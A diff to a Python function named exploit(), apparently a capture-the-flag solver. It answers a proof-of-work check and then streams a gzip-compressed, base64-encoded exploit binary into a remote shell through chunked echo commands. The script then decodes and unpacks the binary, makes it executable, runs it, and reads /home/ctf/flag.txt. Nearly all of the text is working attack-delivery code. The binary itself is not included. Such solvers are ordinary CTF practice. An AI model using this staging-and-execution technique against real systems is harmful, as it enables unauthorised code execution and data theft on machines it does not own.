@@ -33,18 +33,21 @@ def exploit():
   print("[+] finished calc hash: " + hash_res)
   c.sendline(hash_res)
 
-  with open("./exploit.b64", 'r') as f:
+  with open("./exploit.gz.b64", 'r') as f:
     binary = f.read()
   
   progress = 0
+  N = 0x300
   print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
-  for s in [binary[i: i+0x80] for i in range(0, len(binary), 0x80)]:
-    c.sendlineafter('$', 'echo {} >> exploit.b64'.format(s))
-    progress += 0x80
-    if progress % 0x1000 == 0:
+  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
+    c.sendlineafter('$', 'echo -n "{}" >> exploit.gz.b64'.format(s))
+    progress += N
+    if progress % N == 0:
       print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
-  c.sendlineafter('$', 'base64 -d exploit.b64 > exploit')
+  c.sendlineafter('$', 'base64 -d exploit.gz.b64 > exploit.gz')
+  c.sendlineafter('$', 'gunzip ./exploit.gz')
 
+  c.sendlineafter('$', 'chmod +x ./exploit')
   c.sendlineafter('$', './exploit')
   c.sendlineafter('$', 'cat /home/ctf/flag.txt')
 
